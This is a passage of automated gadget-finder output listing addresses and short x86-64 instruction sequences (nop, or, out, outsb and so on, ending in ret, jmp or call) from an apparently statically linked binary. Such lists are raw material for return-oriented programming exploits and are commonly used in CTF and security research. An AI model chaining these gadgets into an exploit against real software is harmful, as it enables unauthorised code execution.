0x000000000041477a : nop word ptr [rax + rax] ; jmp rax
0x000000000040d03a : nop word ptr [rax + rax] ; ret
0x000000000046fe02 : nop word ptr [rax + rax] ; xor eax, eax ; ret
0x000000000040f80b : not edx ; mov byte ptr [rcx], dl ; je 0x40f85b ; mov qword ptr [rsi], rcx ; ret
0x000000000041c777 : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004317af : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041c7a5 : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000041373d : or al, 0 ; add byte ptr [rax], al ; jmp 0x41370b
0x0000000000462002 : or al, 0 ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x0000000000415bd9 : or al, 0 ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000041342a : or al, 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00000000004604d8 : or al, 0 ; add byte ptr [rbx + rax - 0xd], dh ; ret
0x0000000000417fa6 : or al, 0x16 ; movzx eax, byte ptr [rdi + rdx] ; sub eax, ecx ; ret
0x000000000040b303 : or al, 0x24 ; mov rdi, rbx ; call rax
0x0000000000496848 : or al, 0x29 ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; sal edi, 1 ; call qword ptr [rdx]
0x000000000046b3c9 : or al, 0x37 ; jae 0x46b377 ; xor eax, eax ; ret
0x0000000000416920 : or al, 0x39 ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x000000000046af33 : or al, 0x48 ; add esp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000043bdad : or al, 0x48 ; add esp, 0x10 ; pop rbx ; ret
0x000000000046d327 : or al, 0x48 ; add esp, 0x38 ; ret
0x00000000004010e1 : or al, 0x48 ; mov eax, dword ptr [rsp + 0x18] ; call rax
0x000000000046fb93 : or al, 0x5b ; pop rbp ; pop r12 ; ret
0x00000000004484c3 : or al, 0x83 ; inc byte ptr [rbx] ; je 0x4484d7 ; ret
0x000000000044c68a : or al, 0x83 ; ret
0x000000000043a783 : or al, 0x83 ; ret 0x8301
0x000000000043a461 : or al, 0x86 ; add rcx, rsi ; jmp rcx
0x000000000043a4eb : or al, 0x89 ; ret 0xe283
0x0000000000416c13 : or al, 0x8a ; lea r10, [r10 + r9] ; jmp r10
0x000000000042d0d4 : or al, 0x8a ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x00000000004251fd : or al, 0x8b ; add r9, r11 ; jmp r9
0x000000000041fc7d : or al, 0x8b ; lea r9, [r11 + r9] ; jmp r9
0x00000000004620d8 : or al, 0x8e ; add eax, dword ptr [rcx + rdx] ; ret
0x000000000041e5af : or al, 0x93 ; add rcx, r11 ; jmp rcx
0x000000000043638b : or al, 0x93 ; lea rcx, [r11 + rcx] ; jmp rcx
0x000000000041fc81 : or al, 0xb ; jmp r9
0x000000000043638f : or al, 0xb ; jmp rcx
0x000000000045e55c : or al, 0xeb ; ret 0x5590
0x0000000000427743 : or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x00000000004547e5 : or al, 0xf6 ; ret 0xf01
0x0000000000456dac : or al, 0xf6 ; ret 0xf08
0x000000000046048b : or al, byte ptr [rax] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000041c957 : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430341 : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041c985 : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000047725a : or al, byte ptr [rax] ; add byte ptr [rax], al ; mov edi, 1 ; call rax
0x0000000000494945 : or al, byte ptr [rax] ; add byte ptr [rax], bl ; sub edi, esi ; call qword ptr [rax]
0x000000000049bee3 : or al, byte ptr [rcx] ; ret
0x000000000046c394 : or al, ch ; cmpsb byte ptr [rsi], byte ptr [rdi] ; cmp al, 0 ; add byte ptr [rcx - 0x77], cl ; ret
0x000000000046c2cd : or al, ch ; insd dword ptr [rdi], dx ; cmp eax, 0x89490000 ; ret
0x0000000000478408 : or al, ch ; ret 0xf8df
0x0000000000448118 : or al, ch ; ret 0xfcc1
0x000000000047d310 : or bh, 0xfa ; call qword ptr [rax]
0x0000000000416800 : or bh, dh ; ret 0
0x0000000000499589 : or bl, bh ; call qword ptr [rdx]
0x000000000040551d : or bl, byte ptr [rbx + 0x31] ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x0000000000478c4d : or bl, ch ; adc byte ptr [rax - 0x7d], cl ; ret
0x0000000000427903 : or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x000000000043c547 : or bl, dh ; ret
0x00000000004136f5 : or byte ptr [r11 + 0x94807e0], al ; ret
0x000000000043c9a8 : or byte ptr [r11 + 0x94901e0], al ; ret 0x894d
0x000000000043c8e6 : or byte ptr [r11 + r9*4 + 0x57], r9b ; adc byte ptr [rcx - 0x77], cl ; ret
0x0000000000409411 : or byte ptr [r8 + 0x29], r9b ; ret
0x000000000046f29f : or byte ptr [r8 + 2], r15b ; ret
0x00000000004094df : or byte ptr [r8 - 0x3f], r9b ; sti ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x0000000000434838 : or byte ptr [r8 - 0x77], cl ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x0000000000410156 : or byte ptr [r8 - 0x77], r9b ; ret 0x8348
0x0000000000462562 : or byte ptr [r8 - 0x7b], cl ; sal byte ptr [rdi + 0x48], 0x89 ; ret
0x000000000046b3f5 : or byte ptr [r8 - 0x7b], cl ; sal byte ptr [rsp + rsi + 0x48], 0x89 ; ret
0x0000000000476cb7 : or byte ptr [r9 + 0x63], r9b ; add al, 0x86 ; add rax, r14 ; jmp rax
0x00000000004348f7 : or byte ptr [r9 - 0x76b7f7be], cl ; clc ; ret
0x0000000000409412 : or byte ptr [rax + 0x29], cl ; ret
0x000000000040ad65 : or byte ptr [rax + 0x2b], cl ; push rbx ; cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x000000000049c744 : or byte ptr [rax + 0x2d780000], cl ; std ; jmp qword ptr [rdx]
0x0000000000451b0a : or byte ptr [rax + 0x39], cl ; ret 0xf075
0x0000000000415f46 : or byte ptr [rax + 0x39], cl ; ret 0xf475
0x000000000040ee19 : or byte ptr [rax + 0x39], cl ; sal byte ptr [rbx + 0x21], 1 ; movzx eax, byte ptr [rax] ; ret
0x000000000049571a : or byte ptr [rax + 0xb], cl ; add dh, byte ptr [rcx + 0xa] ; ret
0x0000000000410bc6 : or byte ptr [rax + 0xf], cl ; scasd eax, dword ptr [rdi] ; ret 0x8948
0x000000000043ae07 : or byte ptr [rax + 1], bh ; pop rbx ; pop rbp ; ret
0x0000000000469211 : or byte ptr [rax + 1], cl ; ret
0x000000000046f2a0 : or byte ptr [rax + 2], bh ; ret
0x00000000004094e0 : or byte ptr [rax - 0x3f], cl ; sti ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x000000000040f983 : or byte ptr [rax - 0x75], cl ; adc byte ptr [rcx - 0x7d], al ; ret
0x0000000000410153 : or byte ptr [rax - 0x75], cl ; or byte ptr [r8 - 0x77], r9b ; ret 0x8348
0x00000000004649c2 : or byte ptr [rax - 0x75], cl ; push rdi ; push 0x3a058b48 ; jmp qword ptr [rbx]
0x000000000043483d : or byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000040fc52 : or byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; ret
0x000000000040afb8 : or byte ptr [rax - 0x77], cl ; fistp word ptr [rbx + 0x5d] ; jmp rax
0x0000000000434839 : or byte ptr [rax - 0x77], cl ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x0000000000458b2a : or byte ptr [rax - 0x77], cl ; or cl, bpl ; ret 0xffe1
0x00000000004780ae : or byte ptr [rax - 0x77], cl ; ret
0x0000000000410157 : or byte ptr [rax - 0x77], cl ; ret 0x8348
0x00000000004435a4 : or byte ptr [rax - 0x77], cl ; ret 0xc984
0x0000000000458b29 : or byte ptr [rax - 0x77], r9b ; or cl, bpl ; ret 0xffe1
0x000000000046ae78 : or byte ptr [rax - 0x7b], cl ; push qword ptr [rbp - 0x2e] ; ret
0x0000000000462563 : or byte ptr [rax - 0x7b], cl ; sal byte ptr [rdi + 0x48], 0x89 ; ret
0x000000000046b3f6 : or byte ptr [rax - 0x7b], cl ; sal byte ptr [rsp + rsi + 0x48], 0x89 ; ret
0x0000000000413788 : or byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x000000000043cbf2 : or byte ptr [rax - 0x7d], cl ; ret
0x0000000000467177 : or byte ptr [rax - 0x7d], cl ; ret 0x101
0x000000000046e8cd : or byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004696cf : or byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043c94e : or byte ptr [rax - 0xa], al ; mov byte ptr [rcx], 0x75 ; or esi, ebx ; ret
0x0000000000409af6 : or byte ptr [rax - 1], bh ; pop rbx ; pop rbp ; ret
0x000000000040fb08 : or byte ptr [rax], 0 ; add bl, dh ; ret
0x000000000045ef0e : or byte ptr [rax], al ; add al, 0 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000465725 : or byte ptr [rax], al ; add al, ch ; ret
0x000000000040fb09 : or byte ptr [rax], al ; add bl, dh ; ret
0x0000000000447c5a : or byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8948
0x000000000047336a : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000041cc27 : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004304e1 : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041cb65 : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000040ddb7 : or byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000414246 : or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x1bf
0x000000000043a535 : or byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00000000004402f1 : or byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000414146 : or byte ptr [rax], al ; add byte ptr [rcx + rdi - 0x3e], cl ; jne 0x414119 ; ret
0x0000000000431b9e : or byte ptr [rax], r8b ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004774af : or byte ptr [rbp + 0x1a], dh ; mov rax, qword ptr [rax] ; ret
0x000000000046dc38 : or byte ptr [rbp + 0x39], cl ; ret
0x0000000000470296 : or byte ptr [rbp + 0x440f4cf6], al ; ret
0x000000000045db7a : or byte ptr [rbp + 0x708949c9], al ; xor byte ptr [rdi], cl ; ret 0x4389
0x000000000047751e : or byte ptr [rbp + 4], dh ; mov qword ptr [rax], rdx ; ret
0x000000000046da45 : or byte ptr [rbp + rcx*4 + 0x34], cl ; ret 0x8d4a
0x000000000043c3cc : or byte ptr [rbp - 0x7b], cl ; test byte ptr [rdi], 0x94 ; ret 0xc221
0x000000000043bee3 : or byte ptr [rbp - 0x7b], cl ; test byte ptr [rdi], 0x94 ; ret 0xca21
0x000000000040b6c6 : or byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x0000000000401c85 : or byte ptr [rbx + 0x5d], bl ; ret
0x000000000043d09e : or byte ptr [rbx + 0x94801e2], al ; ret 0x8948
0x00000000004136f6 : or byte ptr [rbx + 0x94807e0], al ; ret
0x000000000043c9a9 : or byte ptr [rbx + 0x94901e0], al ; ret 0x894d
0x000000000043c8e7 : or byte ptr [rbx + rcx*4 + 0x57], cl ; adc byte ptr [rcx - 0x77], cl ; ret
0x0000000000451367 : or byte ptr [rbx - 0x1776cf3b], al ; pop rbx ; pop rbp ; ret
0x000000000045e236 : or byte ptr [rbx - 0x3b7cb7fe], cl ; or byte ptr [rbx + 0x5d], bl ; ret
0x0000000000407f89 : or byte ptr [rbx - 0x76fefbbe], al ; ret 0xe281
0x00000000004671e9 : or byte ptr [rbx], al ; add byte ptr [rax], al ; ret
0x000000000046f74a : or byte ptr [rcx + 0x1f0fff], bh ; pop rbx ; ret
0x000000000046f08b : or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x0000000000408547 : or byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; pop r13 ; ret
0x0000000000474926 : or byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; pop r13 ; ret
0x000000000045cc33 : or byte ptr [rcx + 0x415d5bf0], cl ; pop rsp ; pop r13 ; ret
0x0000000000476cb8 : or byte ptr [rcx + 0x63], cl ; add al, 0x86 ; add rax, r14 ; jmp rax
0x0000000000472bdb : or byte ptr [rcx + 1], cl ; ret 0x894c
0x000000000043d014 : or byte ptr [rcx + 9], cl ; rol dword ptr [rcx - 0x7d], cl ; ret 0x4801
0x000000000046e4d0 : or byte ptr [rcx + rax - 0x3e], cl ; mov rax, rdx ; pop rbx ; ret
0x0000000000406731 : or byte ptr [rcx + rcx*4 + 0x54], cl ; and al, 0x20 ; call rax
0x00000000004741c3 : or byte ptr [rcx + rcx*4 - 0x16], cl ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x0000000000409081 : or byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x000000000046f092 : or byte ptr [rcx - 0x2feeb728], cl ; pop rbp ; pop rbx ; ret
0x00000000004348f8 : or byte ptr [rcx - 0x76b7f7be], cl ; clc ; ret
0x0000000000405bbf : or byte ptr [rcx - 0x77], cl ; ret 0x8b4c
0x000000000040c02a : or byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x0000000000447b47 : or byte ptr [rcx], dh ; ror byte ptr [rcx + 0x1e3d8bc5], cl ; ret
0x000000000049c838 : or byte ptr [rcx], dh ; std ; jmp rdx
0x0000000000491d7e : or byte ptr [rdi + 0x26], al ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x00000000004676b0 : or byte ptr [rdi + 0x315], 4 ; xor eax, eax ; ret
0x000000000049a5e1 : or byte ptr [rdi + 0xb], al ; push rsp ; ret
0x0000000000461ec0 : or byte ptr [rdi], cl ; mov dh, 0xc0 ; add rsp, 0x58 ; ret
0x0000000000472d1b : or byte ptr [rdi], cl ; mov dh, 0xc0 ; neg eax ; ret
0x0000000000401316 : or byte ptr [rdi], cl ; ret 0x589
0x000000000042024b : or byte ptr [rdi], cl ; sub dword ptr [rdi], esp ; jmp r9
0x00000000004011a1 : or byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd284
0x00000000004945ea : or byte ptr [rdx + 0xb], cl ; pop rdi ; ret
0x0000000000493e64 : or ch, byte ptr [rsi + rdi*8] ; call qword ptr [rip + 0x20fffe2c]
0x0000000000458b2d : or cl, bpl ; ret 0xffe1
0x0000000000447e01 : or cl, byte ptr [rax + 0x39] ; ret 0x1176
0x0000000000408984 : or cl, byte ptr [rax + 1] ; ret 0x8948
0x00000000004084e7 : or cl, byte ptr [rax - 0x7d] ; ret
0x0000000000415f72 : or cl, byte ptr [rax - 0x7d] ; ret 0x4801
0x000000000049a5df : or cl, byte ptr [rsi] ; or byte ptr [rdi + 0xb], al ; push rsp ; ret
0x0000000000458b2e : or cl, ch ; ret 0xffe1
0x0000000000405e6b : or cl, ch ; ret 0xfffc
0x000000000047e730 : or dh, bh ; sti ; jmp rax
0x0000000000427823 : or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x0000000000479855 : or dh, bl ; ret
0x000000000043cee8 : or dh, dh ; ret 0x7401
0x000000000040fcb6 : or dh, dh ; ret 0x7502
0x000000000043e9c4 : or dh, dh ; ret 0x8902
0x0000000000412a71 : or dh, dh ; ret 0xf04
0x000000000043ef8a : or dword ptr [rax + 1], 0xffffffd8 ; jmp rax
0x000000000040618b : or dword ptr [rax + rax*8 - 0x38b79f8c], eax ; ret 0xfff0
0x00000000004424c7 : or dword ptr [rax - 0x7d], 0x394801c0 ; ret
0x000000000044556f : or dword ptr [rax - 0x7d], ecx ; ret
0x0000000000449eae : or dword ptr [rax - 0x7d], ecx ; ret 0x4101
0x00000000004330be : or dword ptr [rax - 1], ecx ; ret 0xc148
0x000000000045f15b : or dword ptr [rax], eax ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000041cb37 : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000431a4f : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041ca75 : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000409ab7 : or dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x000000000044cfcd : or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x000000000041f9e6 : or dword ptr [rbp - 0xcffffff], 0xf ; outsd dx, dword ptr [rsi] ; push rdi ; ret 0xff3
0x000000000040ad90 : or dword ptr [rbx], 0x20 ; mov eax, 0xffffffff ; pop rbx ; ret
0x000000000040f568 : or dword ptr [rbx], 8 ; pop rbx ; ret
0x000000000044ca8a : or dword ptr [rcx], eax ; add byte ptr [rax + 0x39], cl ; ret
0x00000000004167a7 : or dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000046b766 : or dword ptr [rip + 0x236a7b], 1 ; pop rbx ; ret
0x000000000045610f : or dword ptr [rsi - 0x2f], esi ; mov qword ptr [rdi], rsi ; ret
0x000000000049bee0 : or eax, 0x10a0303 ; ret
0x000000000049bf38 : or eax, 0x1370303 ; ret
0x0000000000436de1 : or eax, 0x1c478d48 ; ret
0x00000000004009fa : or eax, 0x2bd0bf5d ; push 0 ; jmp rax
0x0000000000472e7e : or eax, 0x30c48348 ; pop rbx ; ret
0x000000000049bed0 : or eax, 0x34b0303 ; ret
0x000000000049bf04 : or eax, 0x35b0303 ; ret
0x000000000045c42a : or eax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x8b04
0x000000000045bd82 : or eax, 0x401f0f08 ; add byte ptr [rcx - 0x7d], cl ; ret 0x4c01
0x0000000000449fba : or eax, 0x441f0f ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004326d2 : or eax, 0x48c0bc0f ; lea eax, [rdi + rax] ; ret
0x000000000041c687 : or eax, 0x83480000 ; ret 0x4910
0x0000000000430001 : or eax, 0x83480000 ; ret 0xe910
0x000000000041c6b5 : or eax, 0x83480000 ; ret 0xeb10
0x0000000000456f4d : or eax, 0x83fffffd ; ret
0x0000000000454cbc : or eax, 0x89480000 ; ret 0x8948
0x000000000044f84f : or eax, 0x894c0000 ; ret 0x894c
0x0000000000460d02 : or eax, 0xc2bc0f48 ; shr rax, 2 ; ret
0x0000000000487659 : or eax, 0xdbf0000 ; add byte ptr [rax], al ; ret 0xd
0x00000000004913b3 : or eax, 0xeeb0f650 ; fcmovb st(0), st(3) ; ret
0x00000000004276d3 : or eax, 0xf7f0ff3 ; ret
0x000000000043b6fd : or eax, 0xffffffff ; ret
0x000000000041e309 : or eax, 1 ; ret
0x000000000041c867 : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004301a1 : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041c895 : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000049571c : or eax, dword ptr [rdx] ; jno 0x49572e ; ret
0x000000000049d1ba : or eax, dword ptr [rdx] ; ret 0xe0a
0x000000000040ea14 : or ebp, dword ptr [rbx] ; push rax ; sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x00000000004004cb : or ebp, dword ptr [rdx] ; add byte ptr [rsi - 0x70], ah ; ret
0x000000000040a4dd : or ebp, edx ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000400a3c : or ebx, dword ptr [rbp - 0x41] ; shr byte ptr [rbx], 1 ; push 0 ; jmp rax
0x0000000000427893 : or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x000000000040d786 : or ebx, esi ; ret
0x0000000000415ace : or ecx, dword ptr [rax + 0x63] ; ret
0x000000000040b6b7 : or ecx, dword ptr [rax + 1] ; ret 0x8949
0x0000000000442869 : or ecx, dword ptr [rax - 0x7d] ; ret
0x000000000040f569 : or ecx, dword ptr [rax] ; pop rbx ; ret
0x000000000043c9c2 : or edi, eax ; mov qword ptr [rdx], rdi ; pop rbx ; pop rbp ; ret
0x00000000004277b3 : or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x000000000043c954 : or esi, ebx ; ret
0x000000000040ad91 : or esp, dword ptr [rax] ; mov eax, 0xffffffff ; pop rbx ; ret
0x0000000000494eba : or esp, dword ptr [rsi + rcx + 0x18] ; ret
0x0000000000427902 : or r11b, r14b ; movq qword ptr [rdi], mm1 ; ret
0x0000000000427892 : or r11d, r14d ; movq qword ptr [rdi], mm1 ; ret
0x0000000000427822 : or r14b, r11b ; movq qword ptr [rdi], mm1 ; ret
0x00000000004277b2 : or r14d, r11d ; movq qword ptr [rdi], mm1 ; ret
0x000000000049d1b9 : or r8d, dword ptr [r10] ; ret 0xe0a
0x0000000000447e00 : or r9b, byte ptr [r8 + 0x39] ; ret 0x1176
0x000000000049bf37 : or rax, 0x1370303 ; ret
0x000000000049becf : or rax, 0x34b0303 ; ret
0x000000000049bf03 : or rax, 0x35b0303 ; ret
0x000000000045c429 : or rax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x8b04
0x000000000045bd81 : or rax, 0x401f0f08 ; add byte ptr [rcx - 0x7d], cl ; ret 0x4c01
0x000000000043b6fc : or rax, 0xffffffffffffffff ; ret
0x000000000049571b : or rax, qword ptr [rdx] ; jno 0x49572f ; ret
0x000000000043c9c1 : or rdi, rax ; mov qword ptr [rdx], rdi ; pop rbx ; pop rbp ; ret
0x0000000000494eb9 : or rsp, qword ptr [rsi + r9 + 0x18] ; ret
0x0000000000416ad6 : out 0, al ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x0000000000416996 : out 0, eax ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x0000000000477f55 : out 0x41, eax ; call rdi
0x0000000000441622 : out 0x48, al ; add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x000000000045dead : out 0x48, al ; mov edi, ebx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x0000000000415648 : out 0x48, eax ; sub eax, 0x10 ; ret
0x0000000000414dad : out 0x4c, al ; mov edi, edi ; call 0x411056
0x0000000000413f42 : out 0x4c, al ; mov edi, esi ; call 0x4101d6
0x000000000047afcc : out 0x6b, al ; clc ; call rsi
0x00000000004017dd : out 0x89, al ; out dx, eax ; call qword ptr [r15 + rbx*8]
0x00000000004741c9 : out 0x89, al ; out dx, eax ; call qword ptr [rax]
0x0000000000474065 : out 0x89, al ; out dx, eax ; call qword ptr [rbx]
0x0000000000474025 : out 0x89, al ; out dx, eax ; call rax
0x000000000045e555 : out 0xbe, eax ; cli ; dec dword ptr [rbx - 0x14f3db8c] ; ret 0x5590
0x0000000000449375 : out 0xc1, eax ; sti ; inc dword ptr [rbx - 0x76be0008] ; ret 0x840f
0x0000000000490260 : out 0xcf, eax ; movsb byte ptr [rdi], byte ptr [rsi] ; in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x000000000045f18c : out 0xe8, al ; adc edi, edx ; dec dword ptr [rax + 1] ; ret
0x000000000042709a : out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000042711a : out 0xf3, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000491f88 : out 0xf5, eax ; mov ch, 0xab ; ret
0x000000000041158e : out dx, al ; add ch, byte ptr [rcx] ; add byte ptr [rax + 0x39], cl ; ret
0x000000000047d739 : out dx, al ; cli ; inc dword ptr [rax] ; int1 ; cli ; call qword ptr [rax]
0x00000000004913b7 : out dx, al ; fcmovb st(0), st(3) ; ret
0x00000000004167be : out dx, al ; jns 0x4167c8 ; add byte ptr [rsi + rax*8 - 0xd], dh ; ret
0x000000000042189a : out dx, al ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000044a83a : out dx, al ; mov rdi, qword ptr [rsp + 8] ; call r12
0x000000000044a865 : out dx, al ; mov rdi, r14 ; call r12
0x000000000044a932 : out dx, al ; mov rdi, r15 ; mov rdx, r13 ; call r12
0x000000000044a9a8 : out dx, al ; mov rdi, rbx ; call r12
0x0000000000453167 : out dx, al ; mov rdi, rbx ; call rax
0x00000000004274aa : out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004318fe : out dx, al ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000040588d : out dx, al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000040dfb9 : out dx, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000040e011 : out dx, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004017df : out dx, eax ; call qword ptr [r15 + rbx*8]
0x00000000004741cb : out dx, eax ; call qword ptr [rax]
0x0000000000474067 : out dx, eax ; call qword ptr [rbx]
0x000000000044a829 : out dx, eax ; call r12
0x0000000000478f3d : out dx, eax ; call r14
0x0000000000415137 : out dx, eax ; call rax
0x0000000000460962 : out dx, eax ; call rbx
0x00000000004514f5 : out dx, eax ; cli ; dec dword ptr [rax + 0x29] ; ret
0x00000000004216ca : out dx, eax ; mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004217c6 : out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000421712 : out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000460ab3 : out dx, eax ; mov r9, r14 ; call rbx
0x00000000004067fa : out dx, eax ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000043cc9b : out dx, eax ; mov rsi, qword ptr [rax] ; call r14
0x000000000042752a : out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004319fd : out dx, eax ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041e633 : out dx, eax ; push rsi ; adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000041e648 : out dx, eax ; push rsi ; and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000041e65d : out dx, eax ; push rsi ; xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000438b13 : out dx, eax ; ret 0xf66
0x000000000041fb4c : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x2373
0x000000000041fb35 : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x000000000041fb1e : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x000000000041e5da : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000047de8c : out dx, eax ; xlatb ; sti ; call rsp
0x0000000000474eb7 : out dx, eax ; xor byte ptr [rax - 0x77], cl ; ret 0x2148
0x000000000047c66b : outsb dx, byte ptr [esi] ; add byte ptr [rax], al ; add byte ptr [rax], cl ; xchg eax, esp ; stc ; jmp qword ptr [rax]
0x000000000042f90e : outsb dx, byte ptr [rsi] ; adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000047c66c : outsb dx, byte ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rax], cl ; xchg eax, esp ; stc ; jmp qword ptr [rax]
0x000000000049ae25 : outsb dx, byte ptr [rsi] ; add byte ptr [rax], al ; cwde ; pop rbp ; cld ; jmp qword ptr [rax]
0x0000000000436f3e : outsb dx, byte ptr [rsi] ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7504
0x0000000000491b63 : outsb dx, byte ptr [rsi] ; ja 0x491aec ; ret 0x48f
0x0000000000469210 : outsb dx, byte ptr [rsi] ; or byte ptr [rax + 1], cl ; ret
0x0000000000447b46 : outsb dx, byte ptr [rsi] ; or byte ptr [rcx], dh ; ror byte ptr [rcx + 0x1e3d8bc5], cl ; ret
0x000000000048f8a4 : outsb dx, byte ptr [rsi] ; sahf ; ret 0x38ae
0x0000000000479912 : outsb dx, byte ptr [rsi] ; stosb byte ptr [rdi], al ; and al, byte ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x000000000040fa32 : outsd dx, dword ptr [rsi] ; and al, 0x89 ; adc byte ptr [r11 + 0x5d], r11b ; ret
0x0000000000416d68 : outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x000000000042b28e : outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x000000000041f94d : outsd dx, dword ptr [rsi] ; push rdi ; ret
